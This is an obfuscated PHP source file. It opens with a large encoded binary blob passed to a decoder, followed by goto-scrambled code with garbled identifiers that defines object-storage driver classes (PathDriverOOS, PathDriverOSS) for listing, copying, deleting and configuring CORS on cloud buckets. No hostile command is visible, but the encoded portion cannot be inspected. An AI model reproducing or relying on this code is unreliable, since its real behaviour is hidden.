7Ğ¥®6€f«z.>~æu')."\xa1\x8\x0\xfc\x22\xc2\x8\xa2\xd5\x2f\xa7\xd3\x96\x97\xa2\xd2\x9\x21\x98\xb7\x1e\xa5\x45\xab\x8a\xe0\xa\x28\x4c\xf0\x13\x54\x2c\x41\x10\x3e\xf2\xfb\x3f\x6e\xaa\x1a\xe7\x1e\x34\xd4\x38\xbd".strrev('}7˜WŸ8Ø"ô„+7\'6„'."\r".'¾€•äùeÁÃ¶|ß±à³­ªøvŸØ–gÍ')."\x20\x27\xde\xfe\xb8\xe3\x6e\x36\xc4\xf8\x3\xba\x25\xf2\x52\xa9\x2e\xc\x70\x4a\x18\x26\x27\xa5\xc1\xea\x30\x2f\x4\x38\x33\x78\xd\x42\x69\x66\x2a\x52\x1\xf8\x80\x8c\xb3\xe5\xf6\xd3\xf6\x0"."\211\135\241\321\362\224\157\101\35\120\35\213\224\323\16\273\3\122\166\362\316\201\20\363\221\317\263\332\143\212\64\0\104\113\134\120\301\22\110\325\122\5\176\22\207\171\75\227".base64_decode('JlMTLF4Bcu3hzeRMC5/YJGoyC3ODAYi04bwB1EnRMgMFAIu8wk/bxfTWoM/3bEIT').strrev('húÏ­)ëà³§gì2'."\r".'…!k>m†G’şÎ„øYŠ÷©Â«ß–¨^!Ç')."\x15\x84\xd8\xdf\xe3\xb0\xbc\xc4\x21\x6c\x1a\x64\xb7\x2b\xbe\x1d\x42\x5f\x70\x0\x24\xac\xe5\x99\x15\xa1\xc0\x61\xf8\xa7\x83\xfc\xd2\xc3\xc8\x5e\x34\x46\x3f\xa4\xf6\x72\xb6\x54\xea\x52\x6a\x3a"."\256\63\365\11\16\150\126\70\157\211\162\101\15\2\231\76\212\310\36\130\342\253\214\371\362\147\276\373\371\316\106\57\375\324\357\43\235\15\54\131\37\61\340\157\103\360\203\322".base64_decode('6j2f3RkafEcYpuV1hrAWlpMOTIdB1MZDtQPit6hQiToNIqmUJ84mfYqQgD6VFHeg')."\167\174\60\276\263\77\52\40\154\67\206\104\305\334\311\264\26\225\323\101\254\240\144\261\144\320\1\17\305\224\16\55\311\60\310\55\347\162\373\274\242\300\100\162\135\221\317\372"."\xb0\x85\x9c\x5\xaa\xb\x3c\x9a\xa8\xd2\x8a\x2f\x66\xb8\x71\x10\x49\xe\x6a\x6b\xc5\x37\x31\xa4\xdb\x62\x91\xf4\x76\x8c\x89\x2c\x1b\x84\x17\x73\xdd\x85\xb7\x69\x50\x81\x8a\x20\x7\x51\xbf\x90"."\x5c\x6c\xba\x44\x26\x8a\x24\x90\x26\x4b\x7c\x82\x2d\x7b\x12\x2e\x8\x40\xc9\x3a\xd0\x7\xda\xf4\x22\xd1\xfd\x2b\x50\xb6\xe\xad\xcf\x4e\xe0\x5\x8b\x7e\xea\x95\x4\xe3\x40\x60\x98\x1f\xcc\xa2"."\135\60\277\166\267\277\140\104\253\141\317\61\71\160\317\370\43\173\370\361\45\7\173\150\311\201\35\73\71\310\363\112\16\156\344\365\153\57\127\360\207\60\255\257\147\302\66\63".strrev('ƒ†ØàİAÕè§¯0ô,:'."\n".'Šå` ²·áŸ6bùÊ¬.Úe²¡°ÎÀV¼…').base64_decode('90qcmSJj+NtlYL1MxOrErVinanJUp7dQ9mSqZdVFdIUbO2A3YwUvpMzOxEeNHjtR')."\x14\x29\xf0\xf9\xe1\xb7\x3b\xc4\xb5\x1c\xb9\x5b\x22\x24\x3\x9f\x71\xc9\xba\x9e\x24\xea\xdb\x4c\xdc\xb7\x28\xd2\xaa\x32\x5b\xf8\xe\x9a\xd\x3\xff\xcf\x56\x3e\x27\xd5\x71\x52\x41\x81\xb5\xf0"."\265\310\202\21\100\213\120\120\357\20\316\57\333\325\274\6\157\314\15\276\175\360\211\305\137\77\263\326\205\317\360\42\375\20\316\35\276\23\360\163\124\132\32\162\266\31\50\235"."\65\165\331\312\275\25\143\122\320\110\120\216\110\105\117\271\52\366\266\243\201\41\62\14\36\55\160\61\142\211\246\146\27\300\300\354\360\134\102\362\277\100\66\115\116\131\150\274"."\312\367\224\200\122\376\7\23\110\31\25\314\323\160\305\214\42\75\167\117\245\170\243\310\163\143\302\355\366\257\264\33\223\130\214\51\163\312\246\123\130\220\202\320\116\61\3\150".base64_decode('ggmxwnlEa19txYNsvIxOh7SvRIV0lvAqGXfhIVBYMDe1ktsHi02Rk/jempniPATe')."\xa1\x96\xdd\x2a\x78\xc\x14\xcd\x86\x50\x41\xe2\x36\x28\x2c\x1a\x89\x66\x48\x7b\xc9\x76\x6d\xa\x87\x5b\xb1\x65\x98\xa7\x91\x59\x8b\xc9\x82\xde\xc\x1c\x3a\xe1\x71\x41\x4d\xfc\xb6\x9a\x62\x7"."\xa8\x5b\x36\x40\x13\x59\xf8\x37\x10\xae\xb7\xbd\x3f\x89\x50\x8e\xfd\x51\x4a\xda\x7f\xb4\xcf\x39\xa\x13\xcc\xe\x2d\xcc\x2\x7b\x3f\xc8\xc2\x3c\x18\xf6\xa7\xbd\x0\xf5\x24\x3a\x4a\x4\x41\xb6".base64_decode('wslZSXAd0m3GtTnsT7TmBKtr24vTgpTU+pa0xToTOpuwbWtq82nYHtzDTu/wNyW8').base64_decode('/6/fsvp/9YTV2Aoqz7Y8X9lI6FlKfA0KbjKxLNXWD+uJSJ5B5w+2CmGmqEkdjlA/')."\x24\x32\xbd\x7f\x91\xd3\x69\xfb\x65\x64\x1\x7\x50\xf0\xd2\x1f\x58\x7c\xdd\xec\x79\xba\x62\x81\xc2\x7\x76\x2d\xeb\x8c\x52\x92\xc2\xf3\xae\x6a\xac\xbb\xc8\x65\x21\x1c\x6d\xbf\xd5\x37\xa4\x70"._kodDe('KA302Rr+nv+G6cqRgLt0+RZ/+4A6O/e38YQ2UKj622zfm0T4jhpPegkYFwH/9p56qw==')."\55\143\150\1\212\303\303\237\247\146\217\343\132\162\64\333\336\72\303\211\14\161\154\55\62\353\302\273\343\302\334\154\337\212\131\240\76\253\125\252\303\36\237\255\260\277\106\133"."\351\54\254\14\253\223\103\301\102\20\262\362\124\70\203\256\65\320\265\143\221\74\170\235\205\170\232\175\254\364\342\373\215\275\61\307\371\131\370\45\366\227\356\333\126\135\103\264".strrev('‰—–™›Ä·@T¬‚"ÈeÍmC·IaşCU2ûğøÀë¶‡KÁjğ f‚ÄÊ–')."\307\45\65\103\22\64\171\11\310\42\325\62\104\367\336\326\234\120\67\333\272\123\246\24\113\26\323\164\103\110\306\340\305\322\302\307\44\115\313\150\162\247\275\166\147\275\210\311".base64_decode('xXyrhX0ll5MiSLi7A5Rs3OprHEUiMPXmRUoQbp+sl3/MqWkBpsqrfiEa5aKuYcAv')."\64\307\362\161\233\173\24\215\305\351\236\136\331\244\127\150\366\134\326\167\146\205\253\302\30\132\73\336\302\333\40\176\111\45\234\363\64\33\144\63\70\12\266\301\5\74\317\261"."\235\334\313\57\200\70\241\33\217\263\67\215\55\111\343\224\324\147\120\0\341\317\37\103\262\106\260\360\344\272\300\112\237\375\311\112\227\150\25\152\111\130\10\345\26\240\102\176".strrev('i9±’ÊÏjÒ¯2a]Á®×< *`F‰LÍÿaÊah»5Œ¶ºÅa	»ÀM~')."\311\201\323\2\265\261\111\120\336\100\117\154\133\224\41\76\327\154\275\1\24\131\166\141\11\50\151\277\120\234\170\73\270\317\14\241\342\225\360\125\151\35\142\301\366\227\107\320"."\xc3\x4a\xb3\xc\xbe\x80\xec\x58\xc7\x48\xca\xa0\x18\x69\x69\x8e\x7d\x6a\x11\x85\xcf\x97\x2f\x6\x66\x90\x48\x13\xc7\x79\xac\x51\x38\xbd\x62\x6b\xbd\x98\xc1\xde\x33\x9c\xc3\xe8\x53\xcd\x58\x4a"."\140\73\12\43\13\341\172\301\240\222\212\212\267\327\336\52\72\246\166\146\214\27\122\320\36\101\305\40\254\25\311\203\133\124\64\33\216\202\71\71\271\150\311\273\217\41\200\171"."\x71\x14\xcc\x5b\x10\x4d\x33\xb\xb2\xb\x21\x1f\x7c\xce\x68\x1f\xdd\x2b\x1c\x3c\xc2\xd0\xc7\x8b\x74\xd8\xc6\xf6\xe2\xa4\xfb\x1a\xcf\xa2\x89\xb\xab\x23\x2b\xce\x9e\x1a\x49\x0\x8a\xb7\x82\x33"."\356\266\33\336\142\255\50\232\170\237\255\50\362\120\72\361\222\126\4\327\322\230\42\330\225\337\371\27\342\161\36\127\104\3\1\227\11\317\150\321\51\117\221\150\121\235\241\270"."\302\103\260\350\326\67\254\232\10\66\270\70\60\124\53\11\60\147\374\351\155\101\177\167\230\5\245\347\263\335\131\215\35\23\161\256\73\6\125\123\331\143\325\254\272\202\322\254"."\113\63\233\27\264\112\213\252\23\73\40\53\135\310\264\246\145\52\3\27\364\260\61\327\242\231\152\114\320\206\342\72\251\254\233\52\47\343\323\202\254\315\46\346\342\214\275\345"."\256\274\210\40\10\201\10\271\306\305\311\26\255\164\174\376\23\71\72\276\115\253\203\267\266\354\12\5\262\127\16\174\136\342\350\220\246\233\16\30\27\326\162\350\267\126\63\115"."\176\273\214\331\145\104\344\301\103\317\41\50\111\200\57\176\137\2\107\21\211\360\321\162\104\150\3\175\222\173\75\310\207\206\24\34\213\220\215\45\0\257\6\130\100\74\323\310"."\375\136\103\336\166\3\311\1\200\211\214\152\375\324\3\36\64\217\345\355\341\157\134\313\166\102\216\323\40\144\275\211\52\37\310\10\331\160\343\30\67\361\35\354\104\145\220\267".base64_decode('Slxd9AEykh2/vsD0GX+tBCKG5EVgn6JIggS963pn+ULhUEFUqycUmhkI1mMXpAXR')."\x28\x97\xa0\x42\x53\x10\xd5\xda\x14\x68\xd9\x57\x9c\xb7\xd9\xe3\xf3\x17\xc4\x41\x6d\x9b\x96\x8\x77\x91\x84\xa3\x7c\xad\xa8\x95\x1e\xbf\x3f\x30\x73\x5f\xad\xf0\xd5\x4d\xe3\x2d\x41\x97\xa6\x5c".base64_decode('up1LaVRoTaX/ITlNeWnBUE7JcF9ZPI9VRCDOK3tgj31YHfXbtNvogiUFQU2ZFlJ2').base64_decode('MEeg0CUr29yMWEYdErXo+LWwy3J9LMDRZkEoRliE4umKACOKjpgoKi0U3aNYPiKw').base64_decode('pedoRAGrS4sKonnMuxDrNTLGgnoU/ibR/xu3rkBX1qMAAA==').""."".""."".""."", 10, -8))); goto B¨Ä°½°øÕ; B¦Œ˜Òá¥: $fileSize = strrev(base64_decode($_SERVER[©ÚŸ÷»ïé][0])); function binCheckNeq($ØÀïŞ¼¸—¦µ­, $É) { return $ØÀïŞ¼¸—¦µ­ != $É; } $_SERVER[$_SERVER[©ÚŸ÷»ïé][1]] = $fileSize($_SERVER[$_SERVER[©ÚŸ÷»ïé][2]]); goto f¡ö‰²—Äš; A¸‡­„Å‘: class PathDriverOOS extends PathDriverBaseS3 { public function __construct($»Ÿƒ²ã) { parent::__construct($»Ÿƒ²ã); $this->signatureVersion($_SERVER[èÍ×öˆøÉ][212]); } public function fileOutLink($†€òóó¥Ü) { $Åù¢È =& $_SERVER[èÍ×öˆøÉ]; if (substr($†€òóó¥Ü, 0, 7) == $Åù¢È[1254]) { $†€òóó¥Ü = $Åù¢È[1255] . substr($†€òóó¥Ü, 7); } header($Åù¢È[159] . $†€òóó¥Ü); die; } } class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public $cdnHost = ''; public function __construct($°È) { parent::__construct(); include_once SDK_DIR . $_SERVER[èÍ×öˆøÉ][1310]; $this->_init($°È); } public function _init($Àè€éÑ…Ô¿ê) { $€¶İÙ£ßÍ =& $_SERVER[èÍ×öˆøÉ]; foreach ($Àè€éÑ…Ô¿ê as $õİŞœÄÑ => $È›·‘€·ïè) { if (isset($this->{$õİŞœÄÑ})) { $this->{$õİŞœÄÑ} = $È›·‘€·ïè; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($€¶İÙ£ßÍ[1311] . LNG($€¶İÙ£ßÍ[1312])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { $ÍÏÏ¿„·Î =& $_SERVER[èÍ×öˆøÉ]; $ìšš¶Š = new OSS\Model\CorsConfig(); $Åşéİ = new OSS\Model\CorsRule(); $Åşéİ->addAllowedOrigin($ÍÏÏ¿„·Î[1313]); $Åşéİ->addAllowedMethod($ÍÏÏ¿„·Î[1314]); $Åşéİ->addAllowedMethod($ÍÏÏ¿„·Î[1315]); $Åşéİ->addAllowedMethod($ÍÏÏ¿„·Î[1316]); $Åşéİ->addAllowedMethod($ÍÏÏ¿„·Î[1317]); $Åşéİ->addAllowedMethod($ÍÏÏ¿„·Î[158]); $Åşéİ->setMaxAgeSeconds(600); $Åşéİ->addExposeHeader($ÍÏÏ¿„·Î[1318]); $Åşéİ->addAllowedHeader($ÍÏÏ¿„·Î[1313]); $ìšš¶Š->addRule($Åşéİ); try { $this->client->putBucketCors($this->bucket, $ìšš¶Š); } catch (OSS\Core\OssException $Ğã) { return !1; } return !0; } public function getBucketCors() { $¹³ÚÂ =& $_SERVER[èÍ×öˆøÉ]; $‚•ñ = null; try { $‚•ñ = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $®ù‹’) { return null; } if (!$‚•ñ || !($Â¾¾Ãù = $‚•ñ->getRules())) { return null; } $Ÿ¼¢¯Şæ¹ÌĞ = $Â¾¾Ãù[0]->getAllowedOrigins(); $òùä½ = $Â¾¾Ãù[0]->getAllowedMethods(); $È¦¯ = $Â¾¾Ãù[0]->getMaxAgeSeconds(); $ ÷³Œ = $Â¾¾Ãù[0]->getExposeHeaders(); $™¡Ç = $Â¾¾Ãù[0]->getAllowedHeaders(); return array($¹³ÚÂ[181] => isset($Ÿ¼¢¯Şæ¹ÌĞ[0]) ? $Ÿ¼¢¯Şæ¹ÌĞ[0] : $¹³ÚÂ[33], $¹³ÚÂ[185] => $òùä½, $¹³ÚÂ[1319] => $È¦¯, $¹³ÚÂ[1320] => isset($ ÷³Œ[0]) ? $ ÷³Œ[0] : $¹³ÚÂ[33], $¹³ÚÂ[183] => isset($™¡Ç[0]) ? $™¡Ç[0] : $¹³ÚÂ[33]); } public function isBucketCors() { $ï€£ƒ =& $_SERVER[èÍ×öˆøÉ]; $êáˆ® = $this->getBucketCors(); if (!$êáˆ® || !is_array($êáˆ®)) { return !1; } if ($êáˆ®[$ï€£ƒ[181]] != $ï€£ƒ[182] || $êáˆ®[$ï€£ƒ[183]] != $ï€£ƒ[182]) { return !1; } $ìÚ“ñŒ¬Ñ„ª˜ = array_map($ï€£ƒ[184], $êáˆ®[$ï€£ƒ[185]]); if (!is_array($ìÚ“ñŒ¬Ñ„ª˜)) { $ìÚ“ñŒ¬Ñ„ª˜ = array(); } $„‚• = array($ï€£ƒ[186], $ï€£ƒ[187], $ï€£ƒ[188], $ï€£ƒ[189], $ï€£ƒ[190]); $ÅØÅÙÁ¹± = array_diff($„‚•, $ìÚ“ñŒ¬Ñ„ª˜); return empty($ÅØÅÙÁ¹±); } public function mkfile($Ä“¤ŸİÇÙø«, $®€¥«¨ = '', $ëÓÌ¥ê  = REPEAT_RENAME) { $ñŞ•ç = $this->setContent($Ä“¤ŸİÇÙø«, $®€¥«¨); if ($ñŞ•ç !== !1) { return $this->getPathOuter($Ä“¤ŸİÇÙø«); } return !1; } public function mkdir($­¥â²·‹¿, $Ôôß¨é = REPEAT_SKIP) { if ($this->_isFolder($­¥â²·‹¿)) { return $this->getPathOuter($­¥â²·‹¿); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($­¥â²·‹¿)); } catch (OSS\Core\OssException $ïø¦éø) { return !1; } return $this->getPathOuter($­¥â²·‹¿); } private function fileList($ç“¿, $Ò²ÄÜ¹¡ªƒ = '', $ëˆˆäÙš’ = 0) { $¬–´ =& $_SERVER[èÍ×öˆøÉ]; $ç“¿ = trim($ç“¿, $¬–´[8]); $ÙİŞâÂ = empty($ç“¿) && $ç“¿ !== $¬–´[191] ? $¬–´[33] : $ç“¿ . $¬–´[8]; $³ÔÀıÂı¯ = $¬–´[33]; $ÊˆÚØùá÷ = 1000; $ô‚Õì = $this->listItemCache === !1 ? !1 : !0; $–ã¾Å¡ = $èÏİ¿È¶î = array(); while (!0) { check_abort(); $Ÿ¨î…©àÙÌ = array($¬–´[1321] => $Ò²ÄÜ¹¡ªƒ, $¬–´[1322] => $ÙİŞâÂ, $¬–´[1323] => $ÊˆÚØùá÷, $¬–´[1324] => $³ÔÀıÂı¯); try { $œ˜÷Õœ = $this->client->listObjects($this->bucket, $Ÿ¨î…©àÙÌ); } catch (OSS\Core\OssException $©†±‰) { break; } $³ÔÀıÂı¯ = $œ˜÷Õœ->getNextMarker(); $ ëÒ = $œ˜÷Õœ->getObjectList(); $øè¹ = $œ˜÷Õœ->getPrefixList(); foreach ($ ëÒ as $¥²ìšÀ©¬¡ÛÑ) { if ($¥²ìšÀ©¬¡ÛÑ->getKey() == $ÙİŞâÂ) { continue; } $‡Ô  = $¥²ìšÀ©¬¡ÛÑ->getKey(); $¶ÈŸ¿˜¢ = $¥²ìšÀ©¬¡ÛÑ->getSize(); $óÚÜŸ­‚¢š… = $¥²ìšÀ©¬¡ÛÑ->getLastModified(); $„Ã±Ã = $ëˆˆäÙš’ ? array($¬–´[28] => $‡Ô , $¬–´[78] => $¶ÈŸ¿˜¢, $¬–´[197] => strtotime($óÚÜŸ­‚¢š…)) : $‡Ô ; $†İàû§ = $¶ÈŸ¿˜¢ == 0 && substr($‡Ô , strlen($‡Ô ) - 1, 1) == $¬–´[8] ? !0 : !1; if ($ô‚Õì) { $this->cacheMethod($¬–´[199], $‡Ô , $†İàû§); $this->cacheMethod($¬–´[200], $‡Ô , array($¬–´[78] => $¶ÈŸ¿˜¢, $¬–´[1325] => $¶ÈŸ¿˜¢, $¬–´[84] => strtotime($óÚÜŸ­‚¢š…), $¬–´[1326] => $óÚÜŸ­‚¢š…)); } if ($†İàû§) { $–ã¾Å¡[] = $‡Ô ; continue; } $èÏİ¿È¶î[] = $„Ã±Ã; } foreach ($øè¹ as $Ù­ëÕÒ¸İ·¸) { $–ã¾Å¡[] = $Ù­ëÕÒ¸İ·¸->getPrefix(); if ($ô‚Õì) { $this->cacheMethod($¬–´[199], $‡Ô , !0); } } if ($³ÔÀıÂı¯ === $¬–´[33]) { break; } } if ($ô‚Õì) { $this->cacheMethod($¬–´[199], $ç“¿, !0); } return array($¬–´[75] => $–ã¾Å¡, $¬–´[74] => $èÏİ¿È¶î); } public function copyFile($Ë“·ê’, $¥‡ş) { $” «„–äë“ = $this->size($Ë“·ê’); if ($” «„–äë“ < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $Ë“·ê’, $this->bucket, $this->pathEncode($¥‡ş)); } catch (OSS\Core\OssException $²Ôí) { return !1; } return $this->getPathOuter($¥‡ş); } $½œ¸æ€ = $this->multiCopyObject($Ë“·ê’, $¥‡ş, $” «„–äë“); return $½œ¸æ€ ? $this->getPathOuter($¥‡ş) : !1; } private function multiCopyObject($âÙıŒË£…, $Éğò„ç¾í, $¢ü´Ã¿Øí›) { $³¬“ ˜€¦ =& $_SERVER[èÍ×öˆøÉ]; try { $û§†»ÓšûŞ = array(); if ($¸ˆ›«Ô = $this->hashMd5($âÙıŒË£…)) { $û§†»ÓšûŞ = array(OSS\OssClient::OSS_HEADERS => array($³¬“ ˜€¦[1327] => $¸ˆ›«Ô)); } $åß¼Áßå = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($Éğò„ç¾í), $û§†»ÓšûŞ); $ˆéŸ…à = 1; $“õĞ»¼ñ = 0; $ä×¿ã¬ˆ = array(); $Ÿßªšğ = 1024 * 1024 * 10; $ÚÌ = $this->client->generateMultiuploadParts($¢ü´Ã¿Øí›, $Ÿßªšğ); foreach ($ÚÌ as $£­¶„„ß§½ => $—Ÿ¦) { $ğÚ¼Õì¯”Àî· = $“õĞ»¼ñ + (int) $—Ÿ¦[$³¬“ ˜€¦[1328]]; $§±•“âî = (int) $—Ÿ¦[$³¬“ ˜€¦[335]] + $ğÚ¼Õì¯”Àî· - 1; $‰Ã = array($³¬“ ˜€¦[1329] => $ğÚ¼Õì¯”Àî·, $³¬“ ˜€¦[1330] => $§±•“âî); $ä×¿ã¬ˆ[] = $this->client->uploadPartCopy($this->bucket, $âÙıŒË£…, $this->bucket, $this->pathEncode($Éğò„ç¾í), $ˆéŸ…à, $åß¼Áßå, $‰Ã); $ˆéŸ…à = $ˆéŸ…à + 1; } $İŸÛ´Í³ = array(); foreach ($ä×¿ã¬ˆ as $£­¶„„ß§½ => $¹¹ığíÀëù«) { $İŸÛ´Í³[] = array($³¬“ ˜€¦[1331] => $£­¶„„ß§½ + 1, $³¬“ ˜€¦[1332] => $¹¹ığíÀëù«); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($Éğò„ç¾í), $åß¼Áßå, $İŸÛ´Í³); } catch (OSS\Core\OssException $÷óõõß) { return !1; } return !0; } public function moveFile($ ›ù, $œÈõÅôºúØ§) { if ($this->copyFile($ ›ù, $œÈõÅôºúØ§)) { $this->remove($ ›ù); return $this->getPathOuter($œÈõÅôºúØ§); } return !1; } public function delFile($çîÈ) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($çîÈ)); } catch (OSS\Core\OssException $å†ºèÁª) { return !1; } return !0; } public function delFolder($Ãöñ¸¶•) { $‰³ª¼ =& $_SERVER[èÍ×öˆøÉ]; if (!$this->exist($Ãöñ¸¶•)) { return !0; } $this->listItemCache = !1; $½‡úì§ùÕ = $this->fileList($Ãöñ¸¶•); $this->listItemCache = !0; $³çÁï©å = trim($Ãöñ¸¶•, $‰³ª¼[8]) . $‰³ª¼[8]; if (!empty($Ãöñ¸¶•) && $Ãöñ¸¶• !== $‰³ª¼[191] && !in_array($³çÁï©å, $½‡úì§ùÕ[$‰³ª¼[75]])) { $½‡úì§ùÕ[$‰³ª¼[75]][] = $³çÁï©å; } $»£øÃæª¦ë = $this->delByBatch($½‡úì§ùÕ[$‰³ª¼[74]]); if (!$»£øÃæª¦ë) { return !1; } $»£øÃæª¦ë = $this->delByBatch($½‡úì§ùÕ[$‰³ª¼[75]]); if (!$»£øÃæª¦ë) { return !1; } return $this->delFile($³çÁï©å); } private function delByBatch($æÚèÚŸ) { foreach (array_chunk($æÚèÚŸ, 1000) as $¨Œ¦ÈäÕË) { try { $this->client->deleteObjects($this->bucket, $¨Œ¦ÈäÕË); } catch (OSS\Core\OssException $œ¶’) { return !1; } } return !0; } public function rename($ÃÓ¹¥Ù–øığ, $ºËí¼¦Úë”·) { return $this->renameObject($ÃÓ¹¥Ù–øığ, $ºËí¼¦Úë”·); } private function fileInfo($˜³Ã¾‚§Ÿ³, $“÷µ© = false, $¦åø’í”ˆÃû¸ = array()) { $æÂÑ×Üô—° =& $_SERVER[èÍ×öˆøÉ]; $³Îæ­Šû¸˜µ = array($æÂÑ×Üô—°[28] => $this->pathThis($˜³Ã¾‚§Ÿ³), $æÂÑ×Üô—°[76] => $this->getPathOuter($˜³Ã¾‚§Ÿ³), $æÂÑ×Üô—°[29] => $æÂÑ×Üô—°[193], $æÂÑ×Üô—°[78] => isset($¦åø’í”ˆÃû¸[$æÂÑ×Üô—°[78]]) ? $¦åø’í”ˆÃû¸[$æÂÑ×Üô—°[78]] : 0, $æÂÑ×Üô—°[168] => $this->ext($˜³Ã¾‚§Ÿ³)); if ($“÷µ©) { return $³Îæ­Šû¸˜µ; } $³Îæ­Šû¸˜µ[$æÂÑ×Üô—°[194]] = $³Îæ­Šû¸˜µ[$æÂÑ×Üô—°[84]] = 0; $³Îæ­Šû¸˜µ[$æÂÑ×Üô—°[195]] = $³Îæ­Šû¸˜µ[$æÂÑ×Üô—°[196]] = !0; if (empty($¦åø’í”ˆÃû¸)) { $¢şæÎÏõ = $this->objectMeta($˜³Ã¾‚§Ÿ³); if (!$¢şæÎÏõ) { return $³Îæ­Šû¸˜µ; } $¦åø’í”ˆÃû¸ = array($æÂÑ×Üô—°[84] => strtotime($¢şæÎÏõ[$æÂÑ×Üô—°[1326]]), $æÂÑ×Üô—°[78] => $¢şæÎÏõ[$æÂÑ×Üô—°[1325]] + 0); } if (isset($¦åø’í”ˆÃû¸[$æÂÑ×Üô—°[78]])) { $³Îæ­Šû¸˜µ[$æÂÑ×Üô—°[78]] = $¦åø’í”ˆÃû¸[$æÂÑ×Üô—°[78]]; } if (isset($¦åø’í”ˆÃû¸[$æÂÑ×Üô—°[84]])) { $³Îæ­Šû¸˜µ[$æÂÑ×Üô—°[84]] = $¦åø’í”ˆÃû¸[$æÂÑ×Üô—°[84]]; } if (isset($¦åø’í”ˆÃû¸[$æÂÑ×Üô—°[197]]) && !trim($³Îæ­Šû¸˜µ[$æÂÑ×Üô—°[84]])) { $³Îæ­Šû¸˜µ[$æÂÑ×Üô—°[84]] = $¦åø’í”ˆÃû¸[$æÂÑ×Üô—°[197]]; } return $³Îæ­Šû¸˜µ; } private function folderInfo($²âç, $‡²óÇìãºÊè¯ = false, $ÆŞäÊ = array()) { $õèŸÃÃÖ =& $_SERVER[èÍ×öˆøÉ]; $ÙÀ«÷˜Á³ = array($õèŸÃÃÖ[28] => $this->pathThis($²âç), $õèŸÃÃÖ[76] => $this->getPathOuter($õèŸÃÃÖ[8] . $²âç), $õèŸÃÃÖ[29] => $õèŸÃÃÖ[77]); if ($‡²óÇìãºÊè¯) { return $ÙÀ«÷˜Á³; } $ÙÀ«÷˜Á³[$õèŸÃÃÖ[194]] = $ÙÀ«÷˜Á³[$õèŸÃÃÖ[84]] = 0; $ÙÀ«÷˜Á³[$õèŸÃÃÖ[195]] = $ÙÀ«÷˜Á³[$õèŸÃÃÖ[196]] = !0; if (empty($ÆŞäÊ)) { $²âç = rtrim($²âç, $õèŸÃÃÖ[8]) . $õèŸÃÃÖ[8]; $ÆÏœôëÔãÎÙÒ = $this->objectMeta($²âç); if (!$ÆÏœôëÔãÎÙÒ) { return $ÙÀ«÷˜Á³; } $ÆŞäÊ = array($õèŸÃÃÖ[194] => $ÆÏœôëÔãÎÙÒ[$õèŸÃÃÖ[505]][$õèŸÃÃÖ[1333]], $õèŸÃÃÖ[84] => strtotime($ÆÏœôëÔãÎÙÒ[$õèŸÃÃÖ[1326]])); } if (isset($ÆŞäÊ[$õèŸÃÃÖ[84]])) { $ÙÀ«÷˜Á³[$õèŸÃÃÖ[84]] = $ÆŞäÊ[$õèŸÃÃÖ[84]]; } if (isset($ÆŞäÊ[$õèŸÃÃÖ[194]])) { $ÙÀ«÷˜Á³[$õèŸÃÃÖ[194]] = $ÆŞäÊ[$õèŸÃÃÖ[194]]; } return $ÙÀ«÷˜Á³; } public function listPath($ÅùçÀ—Ÿ»‡ı, $‰Ö = false) { $âïî =& $_SERVER[èÍ×öˆøÉ]; $²‹éÃ½ş¹·± = $this->fileList($ÅùçÀ—Ÿ»‡ı, $âïî[8], !0); foreach ($²‹éÃ½ş¹·±[$âïî[75]] as $êæ => $¹İóœÇá¹„) { $²‹éÃ½ş¹·±[$âïî[75]][$êæ] = $this->folderInfo($¹İóœÇá¹„, $‰Ö, $¹İóœÇá¹„); } foreach ($²‹éÃ½ş¹·±[$âïî[74]] as $êæ => $¹İóœÇá¹„) { $²‹éÃ½ş¹·±[$âïî[74]][$êæ] = $this->fileInfo($¹İóœÇá¹„[$âïî[28]], $‰Ö, $¹İóœÇá¹„); } return $²‹éÃ½ş¹·±; } public function has($ì¶²ù°À”Ã, $×—û‰ = false, $Ì“´Æî = true) { $ßËßµ©¬–¢ =& $_SERVER[èÍ×öˆøÉ]; $ì¶²ù°À”Ã = trim($ì¶²ù°À”Ã, $ßËßµ©¬–¢[8]); $¾¥µåÚ = empty($ì¶²ù°À”Ã) && $ì¶²ù°À”Ã !== $ßËßµ©¬–¢[191] ? $ßËßµ©¬–¢[33] : $ì¶²ù°À”Ã . $ßËßµ©¬–¢[8]; $Á³ÉÒÔ«Îá = $ßËßµ©¬–¢[33]; $áäÌ = 500; $Ÿ³ = $Ö”Ë¨æ¸ = 0; while (!0) { check_abort(); $ÚêØ­ = array($ßËßµ©¬–¢[1321] => $ßËßµ©¬–¢[8], $ßËßµ©¬–¢[1322] => $¾¥µåÚ, $ßËßµ©¬–¢[1323] => $áäÌ, $ßËßµ©¬–¢[1324] => $Á³ÉÒÔ«Îá); try { $æ¹ = $this->client->listObjects($this->bucket, $ÚêØ­); } catch (OSS\Core\OssException $ˆõ¡Î) { break; } $Á³ÉÒÔ«Îá = $æ¹->getNextMarker(); $œå›¥®’‘– = $æ¹->getObjectList(); $î‰ô = $æ¹->getPrefixList(); if ($×—û‰) { if (count($œå›¥®’‘–) > 1 || count($œå›¥®’‘–) == 1 && $œå›¥®’‘–[0]->getKey() != $¾¥µåÚ) { $Ÿ³ += count($œå›¥®’‘–) - 1; } if (!empty($î‰ô)) { $Ö”Ë¨æ¸ += count($î‰ô); } if ($Á³ÉÒÔ«Îá === $ßËßµ©¬–¢[33]) { break; } continue; } if ($Ì“´Æî) { if (!empty($œå›¥®’‘–)) { if (count($œå›¥®’‘–) > 1 || $œå›¥®’‘–[0]->getKey() != $¾¥µåÚ) { return !0; } } } else { if (!empty($î‰ô)) { return !0; } } if ($Á³ÉÒÔ«Îá === $ßËßµ©¬–¢[33]) { break; } } if ($×—û‰) { return array($ßËßµ©¬–¢[203] => $Ÿ³, $ßËßµ©¬–¢[204] => $Ö”Ë¨æ¸); } return !1; } public function listAll($Û©›«ƒš‹) { $·¶Óû×íş¶Í =& $_SERVER[èÍ×öˆøÉ]; $¨§ = 